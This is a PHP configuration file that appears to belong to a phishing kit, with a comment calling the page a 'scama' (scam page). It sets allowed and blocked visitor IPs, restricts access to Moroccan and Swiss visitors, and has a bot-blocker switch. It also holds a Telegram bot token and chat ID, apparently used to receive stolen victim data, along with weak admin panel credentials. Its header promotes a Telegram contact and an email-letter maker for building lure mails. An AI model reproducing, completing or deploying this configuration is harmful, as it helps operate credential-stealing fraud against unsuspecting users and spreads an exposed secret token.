<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW

New website to create html email letters easily for free http://emaillettermaker.online/
                                                                                              
*/





$allowed_ips = ["IP_ADDRESS_1", "IP_ADDRESS_2", "IP_ADDRESS_3"]; // ip li bghiti ichofo scama
$blocked_ips = ["BLOCKED_IP_1", "BLOCKED_IP_2", "BLOCKED_IP_3"]; // List of IPs to block access


$allowed_countries = ['morocco', 'switzerland']; // List of allowed countries


$blocker = "off"; // on = users blocked, off = users not blocked

$price = "00.00"; 


$token = "8218813406:AAEVPKIB3BF50yewqEY1WpmzKD6Saxadpz8";
$chatid = "-5284507955";


// panel login info
$username = "1312";
$password = "1312";

define('ADMIN_USERNAME', $username); // Change this to your desired username
define('ADMIN_PASSWORD_HASH', password_hash($password, PASSWORD_BCRYPT)); // Change password